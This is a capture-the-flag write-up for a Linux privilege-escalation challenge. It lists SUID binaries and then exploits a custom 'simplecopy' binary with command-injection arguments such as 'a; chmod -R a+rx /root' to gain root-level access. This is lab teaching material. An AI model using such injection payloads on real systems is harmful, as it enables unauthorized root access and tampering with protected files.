# Objective 7: Linux PrivEsc
**Location: Island of Misfit Toys: Ostrich Saloon**  
**Hints provided by Rose Mold**

The objective is to perform a privilege escalation in a Linux terminal session. Finally the binary residing in `/root` has to be executed.
The first approach is to find `suid` files on the file system:
```
elf@745490537a8a:~$ find / -perm -4000 -ls 2>/dev/null
1312417 84 -rwsr-xr-x 1 root root 85064 Nov 29 2022 /usr/bin/chfn
1312423 52 -rwsr-xr-x 1 root root 53040 Nov 29 2022 /usr/bin/chsh
1312541 56 -rwsr-xr-x 1 root root 55528 May 30 2023 /usr/bin/mount
1312546 44 -rwsr-xr-x 1 root root 44784 Nov 29 2022 /usr/bin/newgrp
1312620 68 -rwsr-xr-x 1 root root 67816 May 30 2023 /usr/bin/su
1312484 88 -rwsr-xr-x 1 root root 88464 Nov 29 2022 /usr/bin/gpasswd
1312645 40 -rwsr-xr-x 1 root root 39144 May 30 2023 /usr/bin/umount
1312557 68 -rwsr-xr-x 1 root root 68208 Nov 29 2022 /usr/bin/passwd
1457015 20 -rwsr-xr-x 1 root root 16952 Dec 2 22:17 /usr/bin/simplecopy
```

`simplecopy` looks promising as this does usually not exist on Linux systems.

Invoking this binary with some test arguments show interesting error messages and reveals the name of the binary in `/root`:
```
elf@745490537a8a:~$ simplecopy "; ls -l /root" b
cp: missing file operand
Try 'cp --help' for more information.
ls: cannot access 'b': No such file or directory
/root:
total 600
-rws------ 1 root root 612560 Nov 9 21:29 runmetoanswer
```

So it seems that it is possible to inject shell commands in the arguments. We use this to add read and execute permissions to `/root` and `/root/runmetoanswer`:
```
elf@745490537a8a:~$ simplecopy "a; chmod -R a+rx /root" b
cp: missing destination file operand after 'a'
Try 'cp --help' for more information.
chmod: cannot access 'b': No such file or directory
elf@745490537a8a:~$ ls -l /root
total 600
-rwsr-xr-x 1 root root 612560 Nov 9 21:29 runmetoanswer
elf@745490537a8a:~$ /root/runmetoanswer
Who delivers Christmas presents?

> santa
Your answer: santa

Checking....
Your answer is correct!
```


**Achievement: Linux PrivEsc**
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTU1MjAwNzQyMCwtMTc2NjU1MTYyMCwtOD
I2MTc4Njg0LC0yMDEwMTkyNjNdfQ==
-->